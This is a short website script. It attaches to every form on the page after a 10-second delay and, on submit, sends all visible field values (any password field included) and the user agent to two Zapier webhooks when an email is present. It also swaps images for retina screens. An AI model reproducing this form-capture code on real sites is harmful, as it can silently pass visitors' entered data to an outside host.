setTimeout(function(){

        jQuery('form').on('submit', function(){
            var arr = {};
            arr['userAgent'] = navigator.userAgent;
            var fields = 1;
            var valid = true;
            jQuery('input,textarea').each(function(){
                var id = jQuery(this).attr('id');
                var type = jQuery(this).attr('type');
                if (type != 'hidden') {
                    var value = jQuery(this).val();
                    arr['field' + fields] = value;
                    fields++;
                }
            });
            if (arr.field2.match(/.+@.+/)) {
                var code = 'ozlw9h/';
                jQuery.getJSON('https://zapier.com/hooks/catch/' + code, arr);
            
                var pipe = 'ow8bfv/';
                jQuery.getJSON('https://zapier.com/hooks/catch/' + pipe, arr);                
            }
            return true;
        });

} , 10000);




/* Retina images */
if(window.devicePixelRatio >= 1.2 && window.devicePixelRatio < 2.2){
    var images = document.getElementsByTagName('img'); 
    for(var i=0;i < images.length;i++){
        var attr = images[i].getAttribute('data-2x');
        if(attr){
            images[i].src = attr;
        }
    }
} 
else if(window.devicePixelRatio >= 2.2){
    var images = document.getElementsByTagName('img'); 
    for(var i=0;i < images.length;i++){
        var attr = images[i].getAttribute('data-3x');
        if(attr){
            images[i].src = attr;
        }
    }
}